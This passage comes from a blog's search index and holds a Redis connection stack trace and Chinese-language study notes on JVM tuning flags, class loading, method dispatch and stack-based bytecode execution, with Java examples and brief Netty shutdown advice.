javax.management.modelmbean.RequiredModelMBean.invoke(RequiredModelMBean.java:1085) at org.springframework.jmx.export.SpringModelMBean.invoke(SpringModelMBean.java:90) at javax.management.modelmbean.RequiredModelMBean.getAttribute(RequiredModelMBean.java:1562) at org.springframework.jmx.export.SpringModelMBean.getAttribute(SpringModelMBean.java:109) at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.getAttribute(DefaultMBeanServerInterceptor.java:647) at com.sun.jmx.mbeanserver.JmxMBeanServer.getAttribute(JmxMBeanServer.java:678) at javax.management.remote.rmi.RMIConnectionImpl.doOperation(RMIConnectionImpl.java:1445) at javax.management.remote.rmi.RMIConnectionImpl.access$300(RMIConnectionImpl.java:76) at javax.management.remote.rmi.RMIConnectionImpl$PrivilegedOperation.run(RMIConnectionImpl.java:1309) at javax.management.remote.rmi.RMIConnectionImpl.doPrivilegedOperation(RMIConnectionImpl.java:1401) at javax.management.remote.rmi.RMIConnectionImpl.getAttribute(RMIConnectionImpl.java:639) at sun.reflect.GeneratedMethodAccessor85.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:357) at sun.rmi.transport.Transport$1.run(Transport.java:200) at sun.rmi.transport.Transport$1.run(Transport.java:197) at java.security.AccessController.doPrivileged(Native Method) at sun.rmi.transport.Transport.serviceCall(Transport.java:196) at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:568) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:826) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:683) at java.security.AccessController.doPrivileged(Native Method) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:682) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748)Caused by: redis.clients.jedis.exceptions.JedisConnectionException: Could not get a resource from the pool at redis.clients.util.Pool.getResource(Pool.java:53) at redis.clients.jedis.JedisPool.getResource(JedisPool.java:226) at redis.clients.jedis.JedisPool.getResource(JedisPool.java:16) at org.springframework.data.redis.connection.jedis.JedisConnectionFactory.fetchJedisConnector(JedisConnectionFactory.java:194) … 50 common frames omittedCaused by: redis.clients.jedis.exceptions.JedisConnectionException: java.net.ConnectException: Connection refused: connect at redis.clients.jedis.Connection.connect(Connection.java:207) at redis.clients.jedis.BinaryClient.connect(BinaryClient.java:93) at redis.clients.jedis.BinaryJedis.connect(BinaryJedis.java:1767) at redis.clients.jedis.JedisFactory.makeObject(JedisFactory.java:106) at org.apache.commons.pool2.impl.GenericObjectPool.create(GenericObjectPool.java:888) at org.apache.commons.pool2.impl.GenericObjectPool.borrowObject(GenericObjectPool.java:432) at org.apache.commons.pool2.impl.GenericObjectPool.borrowObject(GenericObjectPool.java:361) at redis.clients.util.Pool.getResource(Pool.java:49) … 53 common frames omittedCaused by: java.net.ConnectException: Connection refused: connect at java.net.DualStackPlainSocketImpl.waitForConnect(Native Method) at java.net.DualStackPlainSocketImpl.socketConnect(DualStackPlainSocketImpl.java:85) at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350) at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206) at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188) at java.net.PlainSocketImpl.connect(PlainSocketImpl.java:172) at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392) at java.net.Socket.connect(Socket.java:589) at redis.clients.jedis.Connection.connect(Connection.java:184) … 60 common frames omitte","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"}]},{"title":"SimpleTuning","slug":"SimpleTuning","date":"2020-06-30T16:00:00.000Z","updated":"2020-10-25T08:27:16.000Z","comments":true,"path":"SimpleTuning/","link":"","permalink":"https://gschaos.club/SimpleTuning/","excerpt":"Simple JVM Tuning simulation,一些怪异的面试题，深入java虚拟机部分笔记以及书本部分资料摘抄。","text":"Simple JVM Tuning simulation,一些怪异的面试题，深入java虚拟机部分笔记以及书本部分资料摘抄。 [TOC] SimpleTuningSimple JVM Tuning simulation 运行 设置参数 有一点需要注意的是，如果-Xms和-Xmx没有被设定成相同的值，而且-Xmn被使用了，当调整Java堆的大小的时候， vm_1 : 默认：-Xms:默认为物理内存的1/64 -Xmx:默认为物理内存的1/4或者1G,因为存在堆空间扩容，第一次运行的时候会执行多次FULL GC,通过关闭自适应调整策略(-XX:-UseAdaptiveSizePolicy)，JVM已经事先被禁止动态调整内存池的大小。 -XX:+PrintGCDetails -XX:+UseG1GC -XX:+UseConcMarkSweepGC -XX:+UseParallelGC -XX:+UseSerialGC 除了使用G1算法外，其他的算法实际返回用户可视化的可用空间都将少一个Survivor区的大小的空间-XX:+PrintGCApplicationStoppedTime -XX:+PrintGCApplicationConcurrentTime 获取完整的安全点日志 -Djava.util.concurrent.ForkJoinPool.common.parallelism=核数*2 IO操作时会有很多CPU处在闲置，使用默认线程池个数(机器核数)这样可能会丢失7%的性能，此参数修改ForkJoin的线程池个数， vm_1 : 默认：-Xms:默认为物理内存的1/64 -Xmx:默认为物理内存的1/4或者1G vm_2 : -Xms750m -Xms2048m -Xmx2048m vm_3 : -Xms1024m -Xms2048m -Xmx2048m vm_4 : -Xms1024m -Xms3096m -Xmx3096m vm_5 : -Xms250m -Xms1024m -Xmx1024m 记录书籍例子以及怪异的面试题 部分例子的代码见：jvm_SimpleTuning_github_mysticalycc Integer类 [x] Integer类Cache，以及反射修改导致的问题. @ jdkcode.IntegerCode 类加载 以下整理自 &lt;&lt;深入理解 JAVA虚拟机&gt;&gt; 加载 “加载”(Loading)阶段是“类加载”(Class Loading)过程的第一个阶段，在此阶段，虚拟机需要完成以下三件事情： 1、 通过一个类的全限定名来获取定义此类的二进制字节流。 2、 将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构。 3、 在Java堆中生成一个代表这个类的java.lang.Class对象，作为方法区这些数据的访问入口。 加载阶段即可以使用系统提供的类加载器在完成，也可以由用户自定义的类加载器来完成。加载阶段与连接阶段的部分内容(如一部分字节码文件格式验证动作)是交叉进行的，加载阶段尚未完成，连接阶段可能已经开始。 验证 x1: 文件格式验证 是否以魔数0xCAFEBABE开头。 主次版本是否在当前虚拟机处理范围之内。 常量池常量是否有不被支持的类型 (检查常量tag标志) 指向常量的各种索引值重是否有指向不存在的常量或者不符合类型的常量 CONSTANT_Utf8_info型的常量中是否有不符合UTF8编码的数据。 …… x2: 元数据验证 这个类是否有父类 (除了java.lang.Object之外，所有类都应该有父类) ….. x3: 字节码验证 保证任意时刻操作数栈的数据类型与指令代码序列都能配合工作，例如不会出现在操作栈放置了int类型，使用时却按long类型加载本地变量 保证跳转指令不会跳转到方法体以外的字节码指令上。 保证方法体中的类型转换是有效的。 x4: 符号引用验证： 符号引用验证的目的是确保解析动作能正常执行，如果无法通过验证，则会抛出java.lang.IncompatibleClassChangeError异常的子类, 如java.lang.IllegalAccessError，java.lang.NoSuchFieldError,java.lang.NoSuchMethodError等符号引用非必须，所以在编译器反复验证过的情况下，可以使用 -Xverify:none来关闭以增加类加载的速度。 准备 *准备阶段是正式分配内存并设置类变量初始值的阶段，这些变量将在方法区分配。 此阶段只会对类变量进行内存分配，只对类变量进行设置默认值，类中赋予的值putstatic指令是程序编译后，存放在类构造器&lt;clinit&gt;()方法之中，赋值动作将在初始化阶段才会执行。见例子：classload.LoadClassInit 解析解析阶段是将常量池中的符号引用替换为直接引用的过程。**在进行解析之前需要对符号引用进行解析，不同虚拟机实现可以根据需要判断到底是在类被加载器加载的时候对常量池的符号引用进行解析（也就是初始化之前），还是等到一个符号引用被使用之前进行解析（也就是在初始化之后）。 到现在我们已经明白解析阶段的时机，那么还有一个问题是：如果一个符号引用进行多次解析请求，虚拟机中除了invokedynamic指令外，虚拟机可以对第一次解析的结果进行缓存（在运行时常量池中记录引用，并把常量标识为一解析状态），这样就避免了一个符号引用的多次解析。 解析动作主要针对的是类或者接口、字段、类方法、方法类型、方法句柄和调用点限定符7类符号引用。这里主要说明前四种的解析过程。 类或者接口解析 要把一个类或者接口的符号引用解析为直接引用，需要以下三个步骤： 如果该符号引用不是一个数组类型，那么虚拟机将会把该符号代表的全限定名称传递给类加载器去加载这个类。这个过程由于涉及验证过程所以可能会触发其他相关类的加载 如果该符号引用是一个数组类型，并且该数组的元素类型是对象。我们知道符号引用是存在方法区的常量池中的，该符号引用的描述符会类似”[java/lang/Integer”的形式，将会按照上面的规则进行加载数组元素类型，如果描述符如前面假设的形式，需要加载的元素类型就是java.lang.Integer ,接着由虚拟机将会生成一个代表此数组对象的直接引用 如果上面的步骤都没有出现异常，那么该符号引用已经在虚拟机中产生了一个直接引用，但是在解析完成之前需要对符号引用进行验证，主要是确认当前调用这个符号引用的类是否具有访问权限，如果没有访问权限将抛出java.lang.IllegalAccess异常 字段解析 对字段的解析需要首先对其所属的类进行解析，因为字段是属于类的，只有在正确解析得到其类的正确的直接引用才能继续对字段的解析。对字段的解析主要包括以下几个步骤： 如果该字段符号引用就包含了简单名称和字段描述符都与目标相匹配的字段，则返回这个字段的直接引用，解析结束 否则，如果在该符号的类实现了接口，将会按照继承关系从下往上递归搜索各个接口和它的父接口，如果在接口中包含了简单名称和字段描述符都与目标相匹配的字段，那么久直接返回这个字段的直接引用，解析结束 否则，如果该符号所在的类不是Object类的话，将会按照继承关系从下往上递归搜索其父类，如果在父类中包含了简单名称和字段描述符都相匹配的字段，那么直接返回这个字段的直接引用，解析结束 否则，解析失败，抛出java.lang.NoSuchFieldError异常 见例子：classload.FileResolution 如果最终返回了这个字段的直接引用，就进行权限验证，如果发现不具备对字段的访问权限，将抛出java.lang.IllegalAccessError异常 类方法解析 进行类方法的解析仍然需要先解析此类方法的类，在正确解析之后需要进行如下的步骤： 类方法和接口方法的符号引用是分开的，所以如果在类方法表中发现class_index（类中方法的符号引用）的索引是一个接口，那么会抛出java.lang.IncompatibleClassChangeError的异常 如果class_index的索引确实是一个类，那么在该类中查找是否有简单名称和描述符都与目标字段相匹配的方法，如果有的话就返回这个方法的直接引用，查找结束 否则，在该类的父类中递归查找是否具有简单名称和描述符都与目标字段相匹配的字段，如果有，则直接返回这个字段的直接引用，查找结束 否则，在这个类的接口以及它的父接口中递归查找，如果找到的话就说明这个方法是一个抽象类，查找结束，返回java.lang.AbstractMethodError异常 否则，查找失败，抛出java.lang.NoSuchMethodError异常 如果最终返回了直接引用，还需要对该符号引用进行权限验证，如果没有访问权限，就抛出java.lang.IllegalAccessError异常 接口方法解析 同类方法解析一样，也需要先解析出该方法的类或者接口的符号引用，如果解析成功，就进行下面的解析工作： 如果在接口方法表中发现class_index的索引是一个类而不是一个接口，那么也会抛出java.lang.IncompatibleClassChangeError的异常 否则，在该接口方法的所属的接口中查找是否具有简单名称和描述符都与目标字段相匹配的方法，如果有的话就直接返回这个方法的直接引用。 否则，在该接口以及其父接口中查找，直到Object类，如果找到则直接返回这个方法的直接引用 否则，查找失败 接口的所有方法都是public，所以不存在访问权限问题。 初始化初始化阶段是类加载过程的最后一步，这个阶段才开始真正的执行用户定义的Java程序。在准备阶段，变量已经赋过一次系统要求的初始值，而在初始化阶段，则需要为类变量(非final修饰的类变量)和其他变量赋值，其实就是执行类的()方法。在Java语言体系中，()是由编译器生成的，编译器在编译阶段会自动收集类中的所有类变量的赋值动作和静态语句块(static{})中的语句合并而成的，编译器收集的顺序是由语句的顺序决定的，静态语句块只能访问到定义在静态语句块之前的变量，定义在静态语句块之后的变量，可以赋值，但是不能访问。 &lt;clinit&gt;()方法与类的构造方法不同，它不需要用户显示的调用，虚拟机会保证父类的&lt;clinit&gt;()方法先于子类的&lt;clinit&gt;()执行，java.lang.Object的()方法是最先执行的。接口中不能使用用静态语句块，所以接口的()只包含类变量，所以接口的()方法执行时，不要求限制性父接口的()方法。()方法对于类和接口来说不是必须的，如果类或接口中没有定义类变量，也没有静态语句块，那么编译器将不为这个类或者接口生成()方法，如果类或者接口中生成了()方法，那么这个方法在执行过程中，虚拟机会保证在多线程环境下的线程安全问题。 虚拟机规范给了严格规定，有且只有以下几种情况必须立即对类进行初始化： 1、遇到new、putstatic、getstatic及invokestatic这4条字节码指令时，如果类没有初始化，则立即进行初始化，这4个命令分别代表实例化一个类、设置&amp;读取一个静态字段(没有被final修饰)、调用类的静态方法； 2、使用java.lang.reflect包的方法对类进行反射调用的时候，如果类没有初始化； 3、当初始化一个类的时候，发现其父类没有初始化； 4、当虚拟机启动时，需用将执行启动的主类(有main()方法的那个类)进行初始化； 5、当使用动态语言时，如果一个java.lang.invoke.MethodHandle实例最终的解析结果是REF_getStatic、REF_putStatic、REF_invokeStatic句柄时，并且这个句柄对应的类没有初始化。 [x] 被动使用字段,导致类没有初始化. 对于必须初始化的反例 例子： @ classload.NotInitialization 类与类加载器 对于任意一个类，都需要加载它得加载器和这个类本身一同确立其在Java虚拟机中得唯一性，对于类加载器，都拥有一个独立的类名称空间。 两个类相同 包括代表类的Class对象的equals()方法，isAssignableFrom()方法，isInstance()方法返回结果，也包括使用instanceof关键字做对象所属关系判定等情况，如果未注意类加载器影响，在某些情况下可能会产生迷惑性结果。 例子： classload.ClassLoadDoubleClass 双亲委派 如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的类加载器都是如此，因此所有的加载请求 最终都应该传送到顶层的启动类加载器中，只有当父加载器反馈自己无法完成这个加载请求(它搜索范围中没有找到所需要的类)时，子加载器才会尝试加载 类加载之间是组合关系，非继承关系。由于 类的相同需要与类加载绑定，所以使用双亲委派加载类可以保证rt.jar,bin/lib下面的类都是由系统自身的加载器加载，而不是用户自定义加载，导致多个相同得类存在。 虚拟机字节码执行引擎运行时栈帧结构 栈帧（Stack Frame）是用于支持虚拟机进行方法调用和方法执行的数据结构。它是虚拟机运行时数据区中的虚拟机栈的栈元素。 栈帧存储了方法的局部变量表、操作数栈、动态连接和方法返回地址等信息。 每一个方法从调用开始至执行完成的过程，都对应着一个栈帧在虚拟机里面从入栈到出栈的过程。 在编译程序代码的时候，栈帧中需要多大的局部变量表，多深的操作数栈都已经完全确定了。 因此一个栈帧需要分配多少内存，不会受到程序运行期变量数据的影响，而仅仅取决于具体的虚拟机实现。 局部变量表 局部变量表（Local Variable Table）是一组变量值存储空间，用于存放方法参数和方法内部定义的局部变量。并且在Java编译为Class文件时，就已经确定了该方法所需要分配的局部变量表的最大容量。 局部变量表的容量以变量槽为最小单位，每个变量槽都可以存储32位长度的内存空间，例如boolean、byte、char、short、int、float、reference。 对于64位长度的数据类型（long，double），虚拟机会以高位对齐方式为其分配两个连续的Slot空间，也就是相当于把一次long和double数据类型读写分割成为两次32位读写。 在方法执行时，虚拟机使用局部变量表完成参数值到参数变量列表的传递过程的，如果执行的是实例方法，那局部变量表中第0位索引的Slot默认是用于传递方法所属对象实例的引用。（在方法中可以通过关键字this来访问到这个隐含的参数）。 其余参数则按照参数表顺序排列，占用从1开始的局部变量Slot。 Slot复用 为了尽可能节省栈帧空间，局部变量表中的Slot是可以重用的，也就是说当PC计数器的指令指已经超出了某个变量的作用域（执行完毕），那这个变量对应的Slot就可以交给其他变量使用。 优点 ： 节省栈帧空间。 缺点 ： 影响到系统的垃圾收集行为。（如大方法占用较多的Slot，执行完该方法的作用域后没有对Slot赋值或者清空设置null值，垃圾回收器便不能及时的回收该内存。） 方法调用 方法调用不同于方法执行，方法调用阶段的唯一任务就是确定被调用方法的版本（即调用哪一个方法），暂时还不涉及方法内部的具体运行过程。Class文件的编译过程中不包括传统编译器中的连接步骤，一切方法调用在Class文件里面存储的都是符号引用，而不是方法在实际运行时内存布局中的入口地址（直接引用）。也就是需要在类加载阶段，甚至到运行期才能确定目标方法的直接引用。 解析 如前所述，所有的方法调用中的目标方法在Class文件里面都是一个常量池中的符号引用，在类加载阶段，会将其中的一部分符号引用转化为直接引用，这种解析能成立的前提是：方法在程序真正运行之前就有一个可确定的调用版本，并且这个方法的调用版本在运行期间是不可变的。也就是说，调用目标在程序代码写好、编译器进行编译时就必须确定下来，这类方法的调用成为解析。 JAVA中符号“编译器可知、运行期不可变”的方法包括：静态方法、私有方法两大类。前者与类型直接关联，后者在外部不可被访问，这就决定了他们都不可能通过继承或别的方式重写其版本。因此都适合在类的加载阶段进行解析。 JAVA虚拟机里面提供了5条方法调用字节码指令。分别如下： **invokestatic:**调用静态方法 **invokespecial:**调用实例构造器方法、私有方法和父类方法（super(),super.method()）。 invokevirtual:**调用所有的虚方法(**静态方法、私有方法、实例构造器、父类方法、final方法都是非虚方法)。 **invokeinterface:**调用接口方法，会在运行时期再确定一个实现此接口的对象。 **invokedynamic:**现在运行时期动态解析出调用点限定符所引用的方法，然后再执行该方法，在此之前的4条指令，分派逻辑都是固化在虚拟机里面的，而invokedynamic指令的分派逻辑是由用户所设定的引导方法决定的。 只要能被invokestatic和invokespecial指令调用的方法都可以在解析阶段中确定唯一的调用版本，符合这个条件的有静态方法、私有方法、实例构造器、父类方法4类，它们在类加载阶段就会把符号引用解析为该方法的直接引用。这些方法称为非虚方法（还包括使用final修饰的方法，虽然final方法使用invokevirtual指令调用，因为final方法注定不会被重写，也就是无法被覆盖，也就无需对其进行多态选择）。 解析调用一定是一个静态的过程，在编译期间就可以完全确定，在类装载的解析阶段就会把涉及的符号引用全部转化为可确定的直接引用，不会延迟到运行期去完成。而分派调用可能是静态的也可能是动态的，根据分派一句的宗量数可分为单分派和多分派。因此分派可分为：静态单分派、静态多分派、动态单分派、动态多分派。 分派 1.静态分派（方法重载）： 先看一段代码： 12345678910111213141516171819202122232425262728293031 1 public class StaticDispatch &#123; 2 static abstract class Human&#123; 3 4 &#125; 5 static class Man extends Human&#123; 6 7 &#125; 8 static class Woman extends Human&#123; 9 10 &#125;11 @Test12 public void test()&#123;13 Human man &#x3D; new Man();14 Human woman &#x3D; new Woman();15 StaticDispatch sr &#x3D; new StaticDispatch();16 sr.sayHello(man);17 sr.sayHello(woman);18 19 &#125;20 21 22 public void sayHello(Human guy)&#123;23 System.out.println(&quot;Hello guy&quot;);24 &#125;25 public void sayHello(Man guy)&#123;26 System.out.println(&quot;Hello man&quot;);27 &#125;28 public void sayHello(Woman guy)&#123;29 System.out.println(&quot;Hello woman&quot;);30 &#125;31 &#125; 运行结果为： 12Hello guyHello guy ​ 要解释上面的现象，先要说明几个概念，看如下代码。 Human man = new Man(); 上面一行代码中，Human成为变量man的静态类型，或者叫做外观类型，后面的Man则称为变量的实际类型，静态类型和实际类型在程序中都可以发生一些变化，区别是静态类型的变化仅仅在使用时发生（比如强制类型转换），变量本身的静态类型不会改变，并且最终的静态类型在编译器就是可知的；而实际类型变化的结果在运行期才可以确定，编译器在编译程序的时候并不知道一个对象的实际类型是什么。 比如如下代码： //实际类型变化 Human man = new Man(); Human woman = new Woman(); //通过强转实现静态类型变化(变量本身静态类型不变) sr.sayHello((Man)man); sr.sayHello((Woman)woman); ​ 虚拟机（编译器）在确定重载函数版本时是通过参数的静态类型而不是实际类型作为判定依据。因此，在编译阶段，编译器就可以根据静态类型确定使用哪个重载的版本。 见例子： @ classload.Overload 2.动态分派（方法重写Override）： 为了说明动态分派的概念，先看一段代码： 12345678910111213141516171819202122232425262728 1 public class DynamicDispatch&#123; 2 static abstract class Human&#123; 3 protected abstract void sayHello(); 4 &#125; 5 static class Man extends Human&#123; 6 @Override 7 protected void sayHello()&#123; 8 System.out.println(&quot;man say hello&quot;); 9 &#125;10 &#125;11 static class Woman extends Human&#123;12 @Override13 protected void sayHello()&#123;14 System.out.println(&quot;woman say hello&quot;);15 &#125;16 &#125;17 18 19 public static void man(String[] args)&#123;20 Human man &#x3D; new Man();21 Human woman &#x3D; new Woman();22 man.sayHello();23 woman.sayHello();24 man &#x3D; new Woman();25 man.sayHello();26 27 &#125;28 29 &#125; 输出结果为： 123man say hellowoman say hellowoman say hello 熟悉多态的人对上面的结果不会感到惊讶。下面使用javap命令输出这段代码的字节码。 ​ 如上所示，方法的调用指令都使用了invokevirtual指令，invokevirtual指令的运行时解析过程大致分为以下几个步骤。 ​ 1）找到操作数栈顶的第一个元素(对象引用)所指向的对象的实际类型，记作C； ​ 2）如果在类型C中找到与常量中的描述符和简单名称都相符的方法，则进行访问权限校验，如果通过则返回这个方法的直接引用，查找过程结束；如果不通过，则返回java.lang.IllegalAccessError。 3）否则，按照继承关系从下往上依次对C的各个父类进行第2步的搜索和验证。 4）如果始终没有找到合适的方法，则抛出java.lang.AbstractMethodError异常。 由于invokevirtual指令执行的第一步就是在运行期确定接收者的实际类型，这又是java语言中方法重写产生多态的本质。 3.单分派与多分派 方法的接收者和方法的参数统称为方法的宗量。根据分派基于多少种宗量，可以将分派划分为单分派和多分派。单分派是根据一个宗量对目标方法进行选择，多分派则是根据多于一个宗量对目标方法进行选择。 12345678910111213141516171819202122232425262728293031323334353637 1 import org.junit.Test; 2 3 &#x2F;** 4 * Created by chen on 2016&#x2F;3&#x2F;23. 5 *&#x2F; 6 public class Dispatch &#123; 7 static class QQ&#123; 8 9 &#125;10 static class _360&#123;11 12 &#125;13 14 public static class Father&#123;15 public void hardChoice(QQ arg)&#123;16 System.out.println(&quot;father choose qq&quot;);17 &#125;18 public void hardChoice(_360 arg)&#123;19 System.out.println(&quot;father choose 360&quot;);20 &#125;21 &#125;22 public static class Son extends Father&#123;23 public void hardChoice(QQ arg)&#123;24 System.out.println(&quot;son choose qq&quot;);25 &#125;26 public void hardChoice(_360 arg)&#123;27 System.out.println(&quot;son choose 360&quot;);28 &#125;29 &#125;30 @Test31 public void test()&#123;32 Father father &#x3D; new Father();33 Father son &#x3D; new Son();34 father.hardChoice(new _360());35 son.hardChoice(new QQ());36 &#125;37 &#125; 运行结果： 12father choose 360son choose qq 上述有关于hardChoice方法的两次调用，涉及了静态分派和动态分派的过程。 首先看看编译阶段编译器的选择，也就是静态分派的过程(关于重载)。此时选择目标方法的依据有两点：一是静态类型是Father还是Son，而是方法参数是QQ还是_360。此处选择结果最终的产物是产生了两条invokevirtual指令，两条指令的参数分别是指向Father.hardChoice(_360)和Father.hardChoice(QQ)方法的符号引用。因为是根据两个宗量进行分派，所以java语言的静态分派属于多分派类型。 再看看运行阶段虚拟机的选择，也就是动态分派的过程（关于重写），在执行“son.hardChoice(new QQ());”这句代码时，更准确的说，是在执行invokevirtual指令时，由于编译器已经确定了目标方法的签名必须是hardChoice(QQ)，虚拟机此时不会关心传过来的参数类型，也就是此时传过来的实际类型、静态类型都不会对产生任何影响。唯一可以对虚拟机的选择产生影响的就是此方法的接收者的实际类型是Father还是Son。因为只有一个宗量作为依据，所以java语言的动态分派属于单分派。 4、虚拟机动态分派的实现 由于动态分派是非常频繁的动作，而且动态分派的方法版本选择过程需要运行时在类的方法元数据中搜索合适的目标方法，因此在虚拟机的实际实现中基于性能的考虑，大部分实现都不会真正的进行如此频繁的搜索。面对这种情况，最常用的“稳定优化”手段就是为类在方法区中建立一个虚方法表（vtable，熟悉C++的肯定很熟悉。于此对应的，在invokeinterface执行时也会用到接口方法表—itable），使用虚方法表索引来代替元数据查找以提高性能。具体如下图所示： ​ 虚方法表中存放着各个方法的实际入口地址，如果某个方法在子类中没有被重写，那子类的虚方法表里面的地址入口和父类相同方法的入口地址是一致的，都指向父类的实现入口。如果子类重写了这个方法，子类方法表中的地址将会替换为指向子类实现版本的入口地址。如上图所示，Son重写了来自Father的全部方法，因此Son的方法表没有指向Father类型数据的箭头。但是Son和Father都没有重写来自Object的方法，所以他们的方法表中所有从Object继承来的方法都指向了Object的数据类型。 为了程序实现上的方便，具有相同签名的方法，在父类、子类的虚方法表中都应当具有一样的索引号，这样当类型变换时，仅需要变更查找的方法表，就可以从不同的虚方法表中按照索引转换出所需要的方法入口地址。 方法表一般在类加载阶段的连接阶段进行初始化，准备了类变量初始值之后，虚拟机会把该类的方法表也初始化完毕。 基于栈的字节码解释执行引擎Java编译器输出的指令流，基本上（是因为部分字节码指令会带有参数，而纯粹基于栈的指令集架构中应当全部都是零地址指令，也就是都不存在显式的参数。Java这样实现主要是考虑了代码的可校验性。）是一种基于栈的指令集架构（Instruction Set Arhitecture，ISA），指令流中的指令大部分都是零地址指令，他们依赖操作数栈进行工作。与之相对的另外一套常用的指令集架构是基于寄存器的指令集，最典型的就是x86的二地址指令集，说的通俗一些，就是现在我们主流PC机中直接支持的指令集架构，这些指令依赖寄存器进行工作。那么，基于栈的指令集与基于寄存器的指令集这两者之间有什么不同呢？举个最简单的例子，分别使用这两种指令集计算“1+1”的结果，基于栈的指令集会是这样子的： iconst_1 iconst_1 iadd istore_0 两条iconst_1指令连续把两个常量1压入栈后，iadd指令把栈顶的两个值出栈、相加，然后把结果放回栈顶，最后istore_0把栈顶的值放到局部变量表的第0个Slot中。如果基于寄存器，那程序可能会是这个样子： mov eax,1 add eax,1 mov指令把EAX寄存器的值设为1，然后add指令再把这个值加1，结果就保存在EAX寄存器里面。了解了基于栈的指令集与基于寄存器的指令集的区别后，读者可能会有进一步的疑问，这两套指令集谁更好一些呢？应该这么说，既然两套指令集会同时并存和发展，那肯定是各有优势的，如果有一套指令集全面优于另外一套的话，就不会存在选择的问题了。基于栈的指令集主要优点就是可移植，寄存器由硬件直接提供，程序直接依赖这些硬件寄存器直接提供，程序直接依赖这些硬件寄存器则不可避免地要受到硬件的约束。例如，现在32位80x86体系的处理器中提供了8个32位的寄存器，而ARM体系的CPU（在当前的手机、PDA中相当流行的一种处理器）则提供了16个32位的通用寄存器。如果使用栈架构的指令集，用户程序不会直接使用这些寄存器，就可以由虚拟机实现来自行决定把一些访问最频繁的数据（程序计数器、栈顶缓存等）放到寄存器中以获取尽量好的性能，这样实现起来也更加简单一些。栈架构的指令集还有一些其他的优点，如代码相对更加紧凑（字节码中每个字节就对应一条指令，而多地址指令集中还需要存放参数）、编译器实现更加简单（不需要考虑空间分配的问题，所需空间都在栈上操作）等。栈架构指令集的主要缺点是执行速度相对来说会稍慢一些。所有主流物理机的指令集都是寄存器架构也从侧面印证了这一点。虽然栈架构指令集的代码非常紧凑，但是完成相同功能所需的指令数量一般会比寄存器架构多，因为出栈、入栈操作本身就产生了相当多的指令数量。更重要的是，栈实现在内存之中，频繁的栈访问也就意味着频繁的内存访问，相对于处理器来说，内存始终是执行速度的瓶颈。尽管虚拟机可以采取栈顶缓存的手段，把最常用的操作映射到寄存器中避免直接内存访问，但这也只能是优化措施而不是解决本质问题的方法。由于指令数量和内存访问的原因，所以导致了栈架构指令集的执行速度会相对较慢。 基于栈的解释器执行过程初步的理论知识已经讲解过了，本节准备了一段Java代码，看看在虚拟机中实际是如何执行的。下面准备了四则运算的例子，请看下面代码。 12345678public class CalcTest &#123; public int calc() &#123; int a = 100; int b = 200; int c = 300; return (a+b)*c; &#125;&#125; 从Java语言的角度来看，这段代码没有任何解释的必要，可以直接使用javap命令看看他的字节码指令，如下所示。 javap提示这段代码需要深度为2的操作数栈和4个Slot的局部变量空间，根据这些信息画了下面共7张图，用他们来描述上面执行过程中的代码、操作数栈和局部变量表的变化情况。 上面的执行过程仅仅是一种概念模型，虚拟机最终会对执行过程做一些优化来提高性能，实际运行过程不一定完全符合概念模型的描述……更准确地说，实际情况会和上面的字节码进行优化，例如，在HotSpot虚拟机中，有很多以“fast_”开头的非标准字节码指令用于合并、替换输入的字节码以提升解释执行性能，而即时编译器的优化手段更加花样繁多。不过，我们从这段程序的执行中也可以看出栈结构指令集的一般运行过程，整个运算过程的中间变量都以操作数栈的出栈、入栈为信息交换途径，符合我们在前面分析的特点。 netty在 Netty 中,通过 bootstrap.bind(PORT).sync().channel()方法绑定服务端端口,并不是在调用方的线程(示例为 main 线程)中执行,而是通过 NioEventLoop 线程执行。 netty异步线程启动并非守护线程，在main方法中执行异步绑定端口后即main方法结束，JVM不会结束，需要等到netty异步线程结束或者调用 12worker.shutdownGracefully().sync();boss.shutdownGracefully().sync(); 结束netty的进程来结束JVM。 实际项目中的优化策略初学者很容易出现上述案例中的错误用法，但在实际项目中，很少通过 main 函数直接调用 Netty 服务端，业务往往是通过某种容器（例如 Tomcat、SpringBoot 等）拉起进程，然后通过容器启动来初始化各种业务资源。因此，不需要担心 Netty 服务端意外退出，启动 Netty 服务端比较容易犯的错误是采用同步的方式调用 Netty，导致初始化 Netty 服务端的业务线程被阻塞，举例如下。 错误用法：这种用法会导致调用方的线程一直被阻塞，直到服务端监听句柄关闭。 ◎ 初始化 Netty 服务端。 ◎ 同步阻塞等待服务端端口关闭。 ◎ 释放 I/O 线程资源和句柄等。 ◎ 调用方线程被释放。 正确用法：服务端启动之后注册监听器监听服务端句柄关闭事件，待服务端关闭之后异步调用 shutdownGracefull 释放资源，这样调用方线程就可以快速返回，不会被阻塞。 ◎ 初始化 Netty 服务端。 ◎ 绑定监听端口。 ◎ 向 CloseFuture 注册监听器，在监听器中释放资源。 ◎ 调用方线程返回。 很多开发者习惯了写同步代码，在使用 Netty 之后仍然采用同步阻塞的方式来调用 Netty，尽管功能上也可以正常使用，但是违背了 Netty 的异步设计理念，线程执行效率并不高。 当系统退出时，建议通过调用 EventLoopGroup 的 shutdownGracefully 来完成内存队列中积压消息的处理、链路的关闭和 EventLoop 线程的退出，以实现停机不中断业务（备注：单靠 Netty 框架实际上无法 100% 保证，需要应用配合来实现）。 操作系统复杂的CPU与单纯的内存首先，我们澄清几个容易让人混淆的CPU术语。 